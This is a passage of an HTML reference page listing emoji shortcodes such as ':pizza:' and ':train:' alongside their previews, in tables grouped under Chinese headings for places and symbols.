align="center">:straight_ruler:</td></tr><tr><td align="center"><code>:triangular_ruler:</code></td><td align="center">:triangular_ruler:</td><td align="center"><code>:closed_book:</code></td><td align="center">:closed_book:</td><td align="center"><code>:green_book:</code></td><td align="center">:green_book:</td></tr><tr><td align="center"><code>:blue_book:</code></td><td align="center">:blue_book:</td><td align="center"><code>:orange_book:</code></td><td align="center">:orange_book:</td><td align="center"><code>:notebook:</code></td><td align="center">:notebook:</td></tr><tr><td align="center"><code>:notebook_with_decorative_cover:</code></td><td align="center">:notebook_with_decorative_cover:</td><td align="center"><code>:ledger:</code></td><td align="center">:ledger:</td><td align="center"><code>:books:</code></td><td align="center">:books:</td></tr><tr><td align="center"><code>:bookmark:</code></td><td align="center">:bookmark:</td><td align="center"><code>:microscope:</code></td><td align="center">:microscope:</td><td align="center"><code>:telescope:</code></td><td align="center">:telescope:</td></tr><tr><td align="center"><code>:name_badge:</code></td><td align="center">:name_badge:</td><td align="center"><code>:newspaper:</code></td><td align="center">:newspaper:</td><td align="center"><code>:football:</code></td><td align="center">:football:</td></tr><tr><td align="center"><code>:basketball:</code></td><td align="center">:basketball:</td><td align="center"><code>:soccer:</code></td><td align="center">:soccer:</td><td align="center"><code>:baseball:</code></td><td align="center">:baseball:</td></tr><tr><td align="center"><code>:tennis:</code></td><td align="center">:tennis:</td><td align="center"><code>:8ball:</code></td><td align="center">:8ball:</td><td align="center"><code>:rugby_football:</code></td><td align="center">:rugby_football:</td></tr><tr><td align="center"><code>:bowling:</code></td><td align="center">:bowling:</td><td align="center"><code>:golf:</code></td><td align="center">:golf:</td><td align="center"><code>:mountain_bicyclist:</code></td><td align="center">:mountain_bicyclist:</td></tr><tr><td align="center"><code>:bicyclist:</code></td><td align="center">:bicyclist:</td><td align="center"><code>:horse_racing:</code></td><td align="center">:horse_racing:</td><td align="center"><code>:snowboarder:</code></td><td align="center">:snowboarder:</td></tr><tr><td align="center"><code>:swimmer:</code></td><td align="center">:swimmer:</td><td align="center"><code>:surfer:</code></td><td align="center">:surfer:</td><td align="center"><code>:ski:</code></td><td align="center">:ski:</td></tr><tr><td align="center"><code>:spades:</code></td><td align="center">:spades:</td><td align="center"><code>:hearts:</code></td><td align="center">:hearts:</td><td align="center"><code>:clubs:</code></td><td align="center">:clubs:</td></tr><tr><td align="center"><code>:diamonds:</code></td><td align="center">:diamonds:</td><td align="center"><code>:gem:</code></td><td align="center">:gem:</td><td align="center"><code>:ring:</code></td><td align="center">:ring:</td></tr><tr><td align="center"><code>:trophy:</code></td><td align="center">:trophy:</td><td align="center"><code>:musical_score:</code></td><td align="center">:musical_score:</td><td align="center"><code>:musical_keyboard:</code></td><td align="center">:musical_keyboard:</td></tr><tr><td align="center"><code>:violin:</code></td><td align="center">:violin:</td><td align="center"><code>:space_invader:</code></td><td align="center">:space_invader:</td><td align="center"><code>:video_game:</code></td><td align="center">:video_game:</td></tr><tr><td align="center"><code>:black_joker:</code></td><td align="center">:black_joker:</td><td align="center"><code>:flower_playing_cards:</code></td><td align="center">:flower_playing_cards:</td><td align="center"><code>:game_die:</code></td><td align="center">:game_die:</td></tr><tr><td align="center"><code>:dart:</code></td><td align="center">:dart:</td><td align="center"><code>:mahjong:</code></td><td align="center">:mahjong:</td><td align="center"><code>:clapper:</code></td><td align="center">:clapper:</td></tr><tr><td align="center"><code>:memo:</code></td><td align="center">:memo:</td><td align="center"><code>:pencil:</code></td><td align="center">:pencil:</td><td align="center"><code>:book:</code></td><td align="center">:book:</td></tr><tr><td align="center"><code>:art:</code></td><td align="center">:art:</td><td align="center"><code>:microphone:</code></td><td align="center">:microphone:</td><td align="center"><code>:headphones:</code></td><td align="center">:headphones:</td></tr><tr><td align="center"><code>:trumpet:</code></td><td align="center">:trumpet:</td><td align="center"><code>:saxophone:</code></td><td align="center">:saxophone:</td><td align="center"><code>:guitar:</code></td><td align="center">:guitar:</td></tr><tr><td align="center"><code>:shoe:</code></td><td align="center">:shoe:</td><td align="center"><code>:sandal:</code></td><td align="center">:sandal:</td><td align="center"><code>:high_heel:</code></td><td align="center">:high_heel:</td></tr><tr><td align="center"><code>:lipstick:</code></td><td align="center">:lipstick:</td><td align="center"><code>:boot:</code></td><td align="center">:boot:</td><td align="center"><code>:shirt:</code></td><td align="center">:shirt:</td></tr><tr><td align="center"><code>:tshirt:</code></td><td align="center">:tshirt:</td><td align="center"><code>:necktie:</code></td><td align="center">:necktie:</td><td align="center"><code>:womans_clothes:</code></td><td align="center">:womans_clothes:</td></tr><tr><td align="center"><code>:dress:</code></td><td align="center">:dress:</td><td align="center"><code>:running_shirt_with_sash:</code></td><td align="center">:running_shirt_with_sash:</td><td align="center"><code>:jeans:</code></td><td align="center">:jeans:</td></tr><tr><td align="center"><code>:kimono:</code></td><td align="center">:kimono:</td><td align="center"><code>:bikini:</code></td><td align="center">:bikini:</td><td align="center"><code>:ribbon:</code></td><td align="center">:ribbon:</td></tr><tr><td align="center"><code>:tophat:</code></td><td align="center">:tophat:</td><td align="center"><code>:crown:</code></td><td align="center">:crown:</td><td align="center"><code>:womans_hat:</code></td><td align="center">:womans_hat:</td></tr><tr><td align="center"><code>:mans_shoe:</code></td><td align="center">:mans_shoe:</td><td align="center"><code>:closed_umbrella:</code></td><td align="center">:closed_umbrella:</td><td align="center"><code>:briefcase:</code></td><td align="center">:briefcase:</td></tr><tr><td align="center"><code>:handbag:</code></td><td align="center">:handbag:</td><td align="center"><code>:pouch:</code></td><td align="center">:pouch:</td><td align="center"><code>:purse:</code></td><td align="center">:purse:</td></tr><tr><td align="center"><code>:eyeglasses:</code></td><td align="center">:eyeglasses:</td><td align="center"><code>:fishing_pole_and_fish:</code></td><td align="center">:fishing_pole_and_fish:</td><td align="center"><code>:coffee:</code></td><td align="center">:coffee:</td></tr><tr><td align="center"><code>:tea:</code></td><td align="center">:tea:</td><td align="center"><code>:sake:</code></td><td align="center">:sake:</td><td align="center"><code>:baby_bottle:</code></td><td align="center">:baby_bottle:</td></tr><tr><td align="center"><code>:beer:</code></td><td align="center">:beer:</td><td align="center"><code>:beers:</code></td><td align="center">:beers:</td><td align="center"><code>:cocktail:</code></td><td align="center">:cocktail:</td></tr><tr><td align="center"><code>:tropical_drink:</code></td><td align="center">:tropical_drink:</td><td align="center"><code>:wine_glass:</code></td><td align="center">:wine_glass:</td><td align="center"><code>:fork_and_knife:</code></td><td align="center">:fork_and_knife:</td></tr><tr><td align="center"><code>:pizza:</code></td><td align="center">:pizza:</td><td align="center"><code>:hamburger:</code></td><td align="center">:hamburger:</td><td align="center"><code>:fries:</code></td><td align="center">:fries:</td></tr><tr><td align="center"><code>:poultry_leg:</code></td><td align="center">:poultry_leg:</td><td align="center"><code>:meat_on_bone:</code></td><td align="center">:meat_on_bone:</td><td align="center"><code>:spaghetti:</code></td><td align="center">:spaghetti:</td></tr><tr><td align="center"><code>:curry:</code></td><td align="center">:curry:</td><td align="center"><code>:fried_shrimp:</code></td><td align="center">:fried_shrimp:</td><td align="center"><code>:bento:</code></td><td align="center">:bento:</td></tr><tr><td align="center"><code>:sushi:</code></td><td align="center">:sushi:</td><td align="center"><code>:fish_cake:</code></td><td align="center">:fish_cake:</td><td align="center"><code>:rice_ball:</code></td><td align="center">:rice_ball:</td></tr><tr><td align="center"><code>:rice_cracker:</code></td><td align="center">:rice_cracker:</td><td align="center"><code>:rice:</code></td><td align="center">:rice:</td><td align="center"><code>:ramen:</code></td><td align="center">:ramen:</td></tr><tr><td align="center"><code>:stew:</code></td><td align="center">:stew:</td><td align="center"><code>:oden:</code></td><td align="center">:oden:</td><td align="center"><code>:dango:</code></td><td align="center">:dango:</td></tr><tr><td align="center"><code>:egg:</code></td><td align="center">:egg:</td><td align="center"><code>:bread:</code></td><td align="center">:bread:</td><td align="center"><code>:doughnut:</code></td><td align="center">:doughnut:</td></tr><tr><td align="center"><code>:custard:</code></td><td align="center">:custard:</td><td align="center"><code>:icecream:</code></td><td align="center">:icecream:</td><td align="center"><code>:ice_cream:</code></td><td align="center">:ice_cream:</td></tr><tr><td align="center"><code>:shaved_ice:</code></td><td align="center">:shaved_ice:</td><td align="center"><code>:birthday:</code></td><td align="center">:birthday:</td><td align="center"><code>:cake:</code></td><td align="center">:cake:</td></tr><tr><td align="center"><code>:cookie:</code></td><td align="center">:cookie:</td><td align="center"><code>:chocolate_bar:</code></td><td align="center">:chocolate_bar:</td><td align="center"><code>:candy:</code></td><td align="center">:candy:</td></tr><tr><td align="center"><code>:lollipop:</code></td><td align="center">:lollipop:</td><td align="center"><code>:honey_pot:</code></td><td align="center">:honey_pot:</td><td align="center"><code>:apple:</code></td><td align="center">:apple:</td></tr><tr><td align="center"><code>:green_apple:</code></td><td align="center">:green_apple:</td><td align="center"><code>:tangerine:</code></td><td align="center">:tangerine:</td><td align="center"><code>:lemon:</code></td><td align="center">:lemon:</td></tr><tr><td align="center"><code>:cherries:</code></td><td align="center">:cherries:</td><td align="center"><code>:grapes:</code></td><td align="center">:grapes:</td><td align="center"><code>:watermelon:</code></td><td align="center">:watermelon:</td></tr><tr><td align="center"><code>:strawberry:</code></td><td align="center">:strawberry:</td><td align="center"><code>:peach:</code></td><td align="center">:peach:</td><td align="center"><code>:melon:</code></td><td align="center">:melon:</td></tr><tr><td align="center"><code>:banana:</code></td><td align="center">:banana:</td><td align="center"><code>:pear:</code></td><td align="center">:pear:</td><td align="center"><code>:pineapple:</code></td><td align="center">:pineapple:</td></tr><tr><td align="center"><code>:sweet_potato:</code></td><td align="center">:sweet_potato:</td><td align="center"><code>:eggplant:</code></td><td align="center">:eggplant:</td><td align="center"><code>:tomato:</code></td><td align="center">:tomato:</td></tr><tr><td align="center"><code>:corn:</code></td><td align="center">:corn:</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><h2 id="地点"><a href="#地点" class="headerlink" title="地点"></a>地点</h2><table><thead><tr><th align="center">syntax</th><th align="center">preview</th><th align="center">syntax</th><th align="center">preview</th><th align="center">syntax</th><th align="center">preview</th></tr></thead><tbody><tr><td align="center"><code>:house:</code></td><td align="center">:house:</td><td align="center"><code>:house_with_garden:</code></td><td align="center">:house_with_garden:</td><td align="center"><code>:school:</code></td><td align="center">:school:</td></tr><tr><td align="center"><code>:office:</code></td><td align="center">:office:</td><td align="center"><code>:post_office:</code></td><td align="center">:post_office:</td><td align="center"><code>:hospital:</code></td><td align="center">:hospital:</td></tr><tr><td align="center"><code>:bank:</code></td><td align="center">:bank:</td><td align="center"><code>:convenience_store:</code></td><td align="center">:convenience_store:</td><td align="center"><code>:love_hotel:</code></td><td align="center">:love_hotel:</td></tr><tr><td align="center"><code>:hotel:</code></td><td align="center">:hotel:</td><td align="center"><code>:wedding:</code></td><td align="center">:wedding:</td><td align="center"><code>:church:</code></td><td align="center">:church:</td></tr><tr><td align="center"><code>:department_store:</code></td><td align="center">:department_store:</td><td align="center"><code>:european_post_office:</code></td><td align="center">:european_post_office:</td><td align="center"><code>:city_sunrise:</code></td><td align="center">:city_sunrise:</td></tr><tr><td align="center"><code>:city_sunset:</code></td><td align="center">:city_sunset:</td><td align="center"><code>:japanese_castle:</code></td><td align="center">:japanese_castle:</td><td align="center"><code>:european_castle:</code></td><td align="center">:european_castle:</td></tr><tr><td align="center"><code>:tent:</code></td><td align="center">:tent:</td><td align="center"><code>:factory:</code></td><td align="center">:factory:</td><td align="center"><code>:tokyo_tower:</code></td><td align="center">:tokyo_tower:</td></tr><tr><td align="center"><code>:japan:</code></td><td align="center">:japan:</td><td align="center"><code>:mount_fuji:</code></td><td align="center">:mount_fuji:</td><td align="center"><code>:sunrise_over_mountains:</code></td><td align="center">:sunrise_over_mountains:</td></tr><tr><td align="center"><code>:sunrise:</code></td><td align="center">:sunrise:</td><td align="center"><code>:stars:</code></td><td align="center">:stars:</td><td align="center"><code>:statue_of_liberty:</code></td><td align="center">:statue_of_liberty:</td></tr><tr><td align="center"><code>:bridge_at_night:</code></td><td align="center">:bridge_at_night:</td><td align="center"><code>:carousel_horse:</code></td><td align="center">:carousel_horse:</td><td align="center"><code>:rainbow:</code></td><td align="center">:rainbow:</td></tr><tr><td align="center"><code>:ferris_wheel:</code></td><td align="center">:ferris_wheel:</td><td align="center"><code>:fountain:</code></td><td align="center">:fountain:</td><td align="center"><code>:roller_coaster:</code></td><td align="center">:roller_coaster:</td></tr><tr><td align="center"><code>:ship:</code></td><td align="center">:ship:</td><td align="center"><code>:speedboat:</code></td><td align="center">:speedboat:</td><td align="center"><code>:boat:</code></td><td align="center">:boat:</td></tr><tr><td align="center"><code>:sailboat:</code></td><td align="center">:sailboat:</td><td align="center"><code>:rowboat:</code></td><td align="center">:rowboat:</td><td align="center"><code>:anchor:</code></td><td align="center">:anchor:</td></tr><tr><td align="center"><code>:rocket:</code></td><td align="center">:rocket:</td><td align="center"><code>:airplane:</code></td><td align="center">:airplane:</td><td align="center"><code>:helicopter:</code></td><td align="center">:helicopter:</td></tr><tr><td align="center"><code>:steam_locomotive:</code></td><td align="center">:steam_locomotive:</td><td align="center"><code>:tram:</code></td><td align="center">:tram:</td><td align="center"><code>:mountain_railway:</code></td><td align="center">:mountain_railway:</td></tr><tr><td align="center"><code>:bike:</code></td><td align="center">:bike:</td><td align="center"><code>:aerial_tramway:</code></td><td align="center">:aerial_tramway:</td><td align="center"><code>:suspension_railway:</code></td><td align="center">:suspension_railway:</td></tr><tr><td align="center"><code>:mountain_cableway:</code></td><td align="center">:mountain_cableway:</td><td align="center"><code>:tractor:</code></td><td align="center">:tractor:</td><td align="center"><code>:blue_car:</code></td><td align="center">:blue_car:</td></tr><tr><td align="center"><code>:oncoming_automobile:</code></td><td align="center">:oncoming_automobile:</td><td align="center"><code>:car:</code></td><td align="center">:car:</td><td align="center"><code>:red_car:</code></td><td align="center">:red_car:</td></tr><tr><td align="center"><code>:taxi:</code></td><td align="center">:taxi:</td><td align="center"><code>:oncoming_taxi:</code></td><td align="center">:oncoming_taxi:</td><td align="center"><code>:articulated_lorry:</code></td><td align="center">:articulated_lorry:</td></tr><tr><td align="center"><code>:bus:</code></td><td align="center">:bus:</td><td align="center"><code>:oncoming_bus:</code></td><td align="center">:oncoming_bus:</td><td align="center"><code>:rotating_light:</code></td><td align="center">:rotating_light:</td></tr><tr><td align="center"><code>:police_car:</code></td><td align="center">:police_car:</td><td align="center"><code>:oncoming_police_car:</code></td><td align="center">:oncoming_police_car:</td><td align="center"><code>:fire_engine:</code></td><td align="center">:fire_engine:</td></tr><tr><td align="center"><code>:ambulance:</code></td><td align="center">:ambulance:</td><td align="center"><code>:minibus:</code></td><td align="center">:minibus:</td><td align="center"><code>:truck:</code></td><td align="center">:truck:</td></tr><tr><td align="center"><code>:train:</code></td><td align="center">:train:</td><td align="center"><code>:station:</code></td><td align="center">:station:</td><td align="center"><code>:train2:</code></td><td align="center">:train2:</td></tr><tr><td align="center"><code>:bullettrain_front:</code></td><td align="center">:bullettrain_front:</td><td align="center"><code>:bullettrain_side:</code></td><td align="center">:bullettrain_side:</td><td align="center"><code>:light_rail:</code></td><td align="center">:light_rail:</td></tr><tr><td align="center"><code>:monorail:</code></td><td align="center">:monorail:</td><td align="center"><code>:railway_car:</code></td><td align="center">:railway_car:</td><td align="center"><code>:trolleybus:</code></td><td align="center">:trolleybus:</td></tr><tr><td align="center"><code>:ticket:</code></td><td align="center">:ticket:</td><td align="center"><code>:fuelpump:</code></td><td align="center">:fuelpump:</td><td align="center"><code>:vertical_traffic_light:</code></td><td align="center">:vertical_traffic_light:</td></tr><tr><td align="center"><code>:traffic_light:</code></td><td align="center">:traffic_light:</td><td align="center"><code>:warning:</code></td><td align="center">:warning:</td><td align="center"><code>:construction:</code></td><td align="center">:construction:</td></tr><tr><td align="center"><code>:beginner:</code></td><td align="center">:beginner:</td><td align="center"><code>:atm:</code></td><td align="center">:atm:</td><td align="center"><code>:slot_machine:</code></td><td align="center">:slot_machine:</td></tr><tr><td align="center"><code>:busstop:</code></td><td align="center">:busstop:</td><td align="center"><code>:barber:</code></td><td align="center">:barber:</td><td align="center"><code>:hotsprings:</code></td><td align="center">:hotsprings:</td></tr><tr><td align="center"><code>:checkered_flag:</code></td><td align="center">:checkered_flag:</td><td align="center"><code>:crossed_flags:</code></td><td align="center">:crossed_flags:</td><td align="center"><code>:izakaya_lantern:</code></td><td align="center">:izakaya_lantern:</td></tr><tr><td align="center"><code>:moyai:</code></td><td align="center">:moyai:</td><td align="center"><code>:circus_tent:</code></td><td align="center">:circus_tent:</td><td align="center"><code>:performing_arts:</code></td><td align="center">:performing_arts:</td></tr><tr><td align="center"><code>:round_pushpin:</code></td><td align="center">:round_pushpin:</td><td align="center"><code>:triangular_flag_on_post:</code></td><td align="center">:triangular_flag_on_post:</td><td align="center"><code>:jp:</code></td><td align="center">:jp:</td></tr><tr><td align="center"><code>:kr:</code></td><td align="center">:kr:</td><td align="center"><code>:cn:</code></td><td align="center">:cn:</td><td align="center"><code>:us:</code></td><td align="center">:us:</td></tr><tr><td align="center"><code>:fr:</code></td><td align="center">:fr:</td><td align="center"><code>:es:</code></td><td align="center">:es:</td><td align="center"><code>:it:</code></td><td align="center">:it:</td></tr><tr><td align="center"><code>:ru:</code></td><td align="center">:ru:</td><td align="center"><code>:gb:</code></td><td align="center">:gb:</td><td align="center"><code>:uk:</code></td><td align="center">:uk:</td></tr><tr><td align="center"><code>:de:</code></td><td align="center">:de:</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><h2 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h2><table><thead><tr><th align="center">syntax</th><th align="center">preview</th><th align="center">syntax</th><th align="center">preview</th><th align="center">syntax</th><th align="center">preview</th></tr></thead><tbody><tr><td align="center"><code>:one:</code></td><td align="center">:one:</td><td align="center"><code>:two:</code></td><td align="center">:two:</td><td align="center"><code>:three:</code></td><td align="center">:three:</td></tr><tr><td align="center"><code>:four:</code></td><td align="center">:four:</td><td align="center"><code>:five:</code></td><td align="center">:five:</td><td align="center"><code>:six:</code></td><td align="center">:six:</td></tr><tr><td align="center"><code>:seven:</code></td><td align="center">:seven:</td><td align="center"><code>:eight:</code></td><td align="center">:eight:</td><td align="center"><code>:nine:</code></td><td align="center">:nine:</td></tr><tr><td align="center"><code>:keycap_ten:</code></td><td align="center">:keycap_ten:</td><td align="center"><code>:1234:</code></td><td align="center">:1234:</td><td align="center"><code>:zero:</code></td><td align="center">:zero:</td></tr><tr><td align="center"><code>:hash:</code></td><td align="center">:hash:</td><td align="center"><code>:symbols:</code></td><td align="center">:symbols:</td><td align="center"><code>:arrow_backward:</code></td><td align="center">:arrow_backward:</td></tr><tr><td align="center"><code>:arrow_down:</code></td><td align="center">:arrow_down:</td><td align="center"><code>:arrow_forward:</code></td><td align="center">:arrow_forward:</td><td align="center"><code>:arrow_left:</code></td><td align="center">:arrow_left:</td></tr><tr><td align="center"><code>:capital_abcd:</code></td><td align="center">:capital_abcd:</td><td align="center"><code>:abcd:</code></td><td align="center">:abcd:</td><td align="center"><code>:abc:</code></td><td align="center">:abc:</td></tr><tr><td align="center"><code>:arrow_lower_left:</code></td><td align="center">:arrow_lower_left:</td><td align="center"><code>:arrow_lower_right:</code></td><td align="center">:arrow_lower_right:</td><td align="center"><code>:arrow_right:</code></td><td align="center">:arrow_right:</td></tr><tr><td align="center"><code>:arrow_up:</code></td><td align="center">:arrow_up:</td><td align="center"><code>:arrow_upper_left:</code></td><td align="center">:arrow_upper_left:</td><td align="center"><code>:arrow_upper_right:</code></td><td align="center">:arrow_upper_right:</td></tr><tr><td align="center"><code>:arrow_double_down:</code></td><td align="center">:arrow_double_down:</td><td align="center"><code>:arrow_double_up:</code></td><td align="center">:arrow_double_up:</td><td align="center"><code>:arrow_down_small:</code></td><td align="center">:arrow_down_small:</td></tr><tr><td align="center"><code>:arrow_heading_down:</code></td><td align="center">:arrow_heading_down:</td><td align="center"><code>:arrow_heading_up:</code></td><td align="center">:arrow_heading_up:</td><td align="center"><code>:leftwards_arrow_with_hook:</code></td><td align="center">:leftwards_arrow_with_hook:</td></tr><tr><td align="center"><code>:arrow_right_hook:</code></td><td align="center">:arrow_right_hook:</td><td align="center"><code>:left_right_arrow:</code></td><td align="center">:left_right_arrow:</td><td align="center"><code>:arrow_up_down:</code></td><td align="center">:arrow_up_down:</td></tr><tr><td align="center"><code>:arrow_up_small:</code></td><td align="center">:arrow_up_small:</td><td align="center"><code>:arrows_clockwise:</code></td><td align="center">:arrows_clockwise:</td><td align="center"><code>:arrows_counterclockwise:</code></td><td align="center">:arrows_counterclockwise:</td></tr><tr><td align="center"><code>:rewind:</code></td><td align="center">:rewind:</td><td align="center"><code>:fast_forward:</code></td><td align="center">:fast_forward:</td><td align="center"><code>:information_source:</code></td><td align="center">:information_source:</td></tr><tr><td align="center"><code>:ok:</code></td><td align="center">:ok:</td><td align="center"><code>:twisted_rightwards_arrows:</code></td><td align="center">:twisted_rightwards_arrows:</td><td align="center"><code>:repeat:</code></td><td align="center">:repeat:</td></tr><tr><td align="center"><code>:repeat_one:</code></td><td align="center">:repeat_one:</td><td align="center"><code>:new:</code></td><td align="center">:new:</td><td align="center"><code>:top:</code></td><td align="center">:top:</td></tr><tr><td align="center"><code>:up:</code></td><td align="center">:up:</td><td align="center"><code>:cool:</code></td><td align="center">:cool:</td><td align="center"><code>:free:</code></td><td align="center">:free:</td></tr><tr><td align="center"><code>:ng:</code></td><td align="center">:ng:</td><td align="center"><code>:cinema:</code></td><td align="center">:cinema:</td><td align="center"><code>:koko:</code></td><td align="center">:koko:</td></tr><tr><td align="center"><code>:signal_strength:</code></td><td align="center">:signal_strength:</td><td align="center"><code>:u5272:</code></td><td align="center">:u5272:</td><td align="center"><code>:u5408:</code></td><td align="center">:u5408:</td></tr><tr><td align="center"><code>:u55b6:</code></td><td align="center">:u55b6:</td><td align="center"><code>:u6307:</code></td><td align="center">:u6307:</td><td align="center"><code>:u6708:</code></td><td align="center">:u6708:</td></tr><tr><td align="center"><code>:u6709:</code></td><td align="center">:u6709:</td><td align="center"><code>:u6e80:</code></td><td align="center">:u6e80:</td><td align="center"><code>:u7121:</code></td><td align="center">:u7121:</td></tr><tr><td align="center"><code>:u7533:</code></td><td align="center">:u7533:</td><td align="center"><code>:u7a7a:</code></td><td align="center">:u7a7a:</td><td align="center"><code>:u7981:</code></td><td align="center">:u7981:</td></tr><tr><td align="center"><code>:sa:</code></td><td align="center">:sa:</td><td align="center"><code>:restroom:</code></td><td align="center">:restroom:</td><td align="center"><code>:mens:</code></td><td align="center">:mens:</td></tr><tr><td align="center"><code>:womens:</code></td><td align="center">:womens:</td><td align="center"><code>:baby_symbol:</code></td><td align="center">:baby_symbol:</td><td align="center"><code>:no_smoking:</code></td><td align="center">:no_smoking:</td></tr><tr><td align="center"><code>:parking:</code></td><td align="center">:parking:</td><td align="center"><code>:wheelchair:</code></td><td align="center">:wheelchair:</td><td align="center"><code>:metro:</code></td><td align="center">:metro:</td></tr><tr><td align="center"><code>:baggage_claim:</code></td><td align="center">:baggage_claim:</td><td align="center"><code>:accept:</code></td><td align="center">:accept:</td><td align="center"><code>:wc:</code></td><td align="center">:wc:</td></tr><tr><td align="center"><code>:potable_water:</code></td><td align="center">:potable_water:</td><td align="center"><code>:put_litter_in_its_place:</code></td><td align="center">:put_litter_in_its_place:</td><td align="center"><code>:secret:</code></td><td align="center">:secret:</td></tr><tr><td align="center"><code>:congratulations:</code></td><td align="center">:congratulations:</td><td align="center"><code>:m:</code></td><td align="center">:m:</td><td align="center"><code>:passport_control:</code></td><td align="center">:passport_control:</td></tr><tr><td align="center"><code>:left_luggage:</code></td><td align="center">:left_luggage:</td><td align="center"><code>:customs:</code></td><td align="center">:customs:</td><td align="center"><code>:ideograph_advantage:</code></td><td align="center">:ideograph_advantage:</td></tr><tr><td align="center"><code>:cl:</code></td><td align="center">:cl:</td><td align="center"><code>:sos:</code></td><td align="center">:sos:</td><td align="center"><code>:id:</code></td><td align="center">:id:</td></tr><tr><td align="center"><code>:no_entry_sign:</code></td><td align="center">:no_entry_sign:</td><td align="center"><code>:underage:</code></td><td align="center">:underage:</td><td align="center"><code>:no_mobile_phones:</code></td><td align="center">:no_mobile_phones:</td></tr><tr><td align="center"><code>:do_not_litter:</code></td><td align="center">:do_not_litter:</td><td align="center"><code>:non-potable_water:</code></td><td align="center">:non-potable_water:</td><td align="center"><code>:no_bicycles:</code></td><td align="center">:no_bicycles:</td></tr><tr><td align="center"><code>:no_pedestrians:</code></td><td align="center">:no_pedestrians:</td><td align="center"><code>:children_crossing:</code></td><td align="center">:children_crossing:</td><td align="center"><code>:no_entry:</code></td><td align="center">:no_entry:</td></tr><tr><td align="center"><code>:eight_spoked_asterisk:</code></td><td align="center">:eight_spoked_asterisk:</td><td align="center"><code>:eight_pointed_black_star:</code></td><td align="center">:eight_pointed_black_star:</td><td align="center"><code>:heart_decoration:</code></td><td align="center">:heart_decoration:</td></tr><tr><td align="center"><code>:vs:</code></td><td align="center">:vs:</td><td align="center"><code>:vibration_mode:</code></td><td align="center">:vibration_mode:</td><td align="center"><code>:mobile_phone_off:</code></td><td align="center">:mobile_phone_off:</td></tr><tr><td align="center"><code>:chart:</code></td><td align="center">:chart:</td><td align="center"><code>:currency_exchange:</code></td><td align="center">:currency_exchange:</td><td align="center"><code>:aries:</code></td><td align="center">:aries:</td></tr><tr><td align="center"><code>:taurus:</code></td><td align="center">:taurus:</td><td align="center"><code>:gemini:</code></td><td align="center">:gemini:</td><td align="center"><code>:cancer:</code></td><td align="center">:cancer:</td></tr><tr><td align="center"><code>:leo:</code></td><td align="center">:leo:</td><td align="center"><code>:virgo:</code></td><td align="center">:virgo:</td><td align="center"><code>:libra:</code></td><td align="center">:libra:</td></tr><tr><td align="center"><code>:scorpius:</code></td><td align="center">:scorpius:</td><td align="center"><code>:sagittarius:</code></td><td align="center">:sagittarius:</td><td align="center"><code>:capricorn:</code></td><td align="center">:capricorn:</td></tr><tr><td align="center"><code>:aquarius:</code></td><td align="center">:aquarius:</td><td align="center"><code>:pisces:</code></td><td align="center">:pisces:</td><td align="center"><code>:ophiuchus:</code></td><td align="center">:ophiuchus:</td></tr><tr><td align="center"><code>:six_pointed_star:</code></td><td align="center">:six_pointed_star:</td><td align="center"><code>:negative_squared_cross_mark:</code></td><td align="center">:negative_squared_cross_mark:</td><td align="center"><code>:a:</code></td><td align="center">:a:</td></tr><tr><td align="center"><code>:b:</code></td><td align="center">:b:</td><td align="center"><code>:ab:</code></td><td align="center">:ab:</td><td align="center"><code>:o2:</code></td><td align="center">:o2:</td></tr><tr><td align="center"><code>:diamond_shape_with_a_dot_inside:</code></td><td align="center">:diamond_shape_with_a_dot_inside:</td><td align="center"><code>:recycle:</code></td><td align="center">:recycle:</td><td align="center"><code>:end:</code></td><td align="center">:end:</td></tr><tr><td align="center"><code>:on:</code></td><td align="center">:on:</td><td align="center"><code>:soon:</code></td><td align="center">:soon:</td><td align="center"><code>:clock1:</code></td><td align="center">:clock1:</td></tr><tr><td align="center"><code>:clock130:</code></td><td align="center">:clock130:</td><td align="center"><code>:clock10:</code></td><td align="center">:clock10:</td><td align="center"><code>:clock1030:</code></td><td align="center">:clock1030:</td></tr><tr><td align="center"><code>:clock11:</code></td><td align="center">:clock11:</td><td align="center"><code>:clock1130:</code></td><td align="center">:clock1130:</td><td align="center"><code>:clock12:</code></td><td align="center">:clock12:</td></tr><tr><td align="center"><code>:clock1230:</code></td><td align="center">:clock1230:</td><td align="center"><code>:clock2:</code></td><td align="center">:clock2:</td><td align="center"><code>:clock230:</code></td><td align="center">:clock230:</td></tr><tr><td align="center"><code>:clock3:</code></td><td align="center">:clock3:</td><td align="center"><code>:clock330:</code></td><td align="center">:clock330:</td><td align="center"><code>:clock4:</code></td><td align="center">:clock4:</td></tr><tr><td align="center"><code>:clock430:</code></td><td align="center">:clock430:</td><td align="center"><code>:clock5:</code></td><td align="center">:clock5:</td><td align="center"><code>:clock530:</code></td><td align="center">:clock530:</td></tr><tr><td align="center"><code>:clock6:</code></td><td align="center">:clock6:</td><td align="center"><code>:clock630:</code></td><td align="center">:clock630:</td><td align="center"><code>:clock7:</code></td><td align="center">:clock7:</td></tr><tr><td align="center"><code>:clock730:</code></td><td align="center">:clock730:</td><td align="center"><code>:clock8:</code></td><td align="center">:clock8:</td><td align="center"><code>:clock830:</code></td><td align="center">:clock830:</td></tr><tr><td align="center"><code>:clock9:</code></td><td align="center">:clock9:</td><td align="center"><code>:clock930:</code></td><td align="center">:clock930:</td><td align="center"><code>:heavy_dollar_sign:</code></td><td align="center">:heavy_dollar_sign:</td></tr><tr><td align="center"><code>:copyright:</code></td><td align="center">:copyright:</td><td align="center"><code>:registered:</code></td><td align="center">:registered:</td><td align="center"><code>:tm:</code></td><td align="center">:tm:</td></tr><tr><td align="center"><code>:x:</code></td><td align="center">:x:</td><td align="center"><code>:heavy_exclamation_mark:</code></td><td align="center">:heavy_exclamation_mark:</td><td align="center"><code>:bangbang:</code></td><td align="center">:bangbang:</td></tr><tr><td align="center"><code>:interrobang:</code></td><td align="center">:interrobang:</td><td align="center"><code>:o:</code></td><td align="center">:o:</td><td align="center"><code>:heavy_multiplication_x:</code></td><td align="center">:heavy_multiplication_x:</td></tr><tr><td align="center"><code>:heavy_plus_sign:</code></td><td align="center">:heavy_plus_sign:</td><td align="center"><code>:heavy_minus_sign:</code></td><td align="center">:heavy_minus_sign:</td><td align="center"><code>:heavy_division_sign:</code></td><td align="center">:heavy_division_sign:</td></tr><tr><td align="center"><code>:white_flower:</code></td><td align="center">:white_flower:</td><td align="center"><code>:100:</code></td><td align="center">:100:</td><td align="center"><code>:heavy_check_mark:</code></td><td 